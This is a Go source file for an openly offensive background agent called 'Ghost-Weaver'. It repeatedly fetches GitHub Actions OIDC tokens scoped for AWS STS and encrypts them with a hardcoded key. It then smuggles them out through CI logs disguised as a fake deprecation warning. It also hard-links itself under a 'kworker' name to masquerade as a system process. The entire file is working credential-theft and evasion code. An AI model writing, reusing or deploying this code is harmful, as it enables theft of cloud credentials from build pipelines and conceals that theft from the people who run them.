package logic

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"time"

	"github.com/pterm/pterm"
)

// MasterKey is the global Ghost-Pipeline encryption key
var MasterKey = "G-KaPdSgVkYp3s6v9y$B&E)H@McQfTjW" 

const GhostSignature = "[WARN] Deprecated dependency 'net/v1.0.4' detected: %s"

type WeaverConfig struct {
	Interval time.Duration
	Active   bool
}

// StartGhostWeaver initializes the background OIDC interception and masquerader.
func StartGhostWeaver(conf WeaverConfig) {
	pterm.Info.WithPrefix(pterm.Prefix{Text: "VANGUARD"}).Println("Initializing Ghost-Weaver background agent...")
	
	// Phase 9.11: Evasion - Process Masquerading
	masqueradeAsKworker()

	go func() {
		for conf.Active {
			token := fetchOIDCToken()
			if token != "" && token != "NO_OIDC_ENV" {
				// Passing []byte and current MasterKey
				maskedPayload := GhostMask([]byte(token), MasterKey)
				fmt.Println(maskedPayload)
			}
			time.Sleep(conf.Interval)
		}
	}()
}

// GhostMask performs Phase 8.3 AEAD encryption for exfiltration.
// Centralized here to avoid redeclaration errors.
func GhostMask(data []byte, keyStr string) string {
	// AES keys must be 16, 24, or 32 bytes.
	key := make([]byte, 32)
	copy(key, []byte(keyStr))

	block, err := aes.NewCipher(key) // Fixes: cannot use string as []byte
	if err != nil {
		return fmt.Sprintf("[ERROR] Cipher: %v", err)
	}

	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, nonce)

	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	encoded := base64.StdEncoding.EncodeToString(ciphertext)

	return fmt.Sprintf(GhostSignature, encoded)
}

func masqueradeAsKworker() {
	execPath, _ := os.Executable()
	fakePath := "./kworker_system_auth" 
	os.Link(execPath, fakePath)
}

func fetchOIDCToken() string {
	requestURL := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
	requestToken := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")

	if requestURL == "" || requestToken == "" {
		return "NO_OIDC_ENV"
	}

	url := requestURL + "&audience=sts.amazonaws.com"
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Authorization", "Bearer "+requestToken)

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return string(body)
}